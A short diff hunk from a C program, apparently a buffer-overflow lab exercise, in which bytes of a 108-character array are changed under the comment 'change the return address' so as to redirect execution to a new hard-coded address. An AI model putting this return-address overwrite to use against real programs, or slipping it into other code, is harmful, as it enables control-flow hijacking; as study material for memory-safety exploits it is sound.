@@ -149,8 +149,8 @@ int main(int argc,char *argv[]) {
 	char S[108] = "Frank";	
 
 	//change the return address
-	S[104] = 0x43;
-	S[105] = 0x28;
+	S[104] = 0x73;
+	S[105] = 0x29;
 	S[106] = 0x40;
 	S[107] = 0x00;
 	
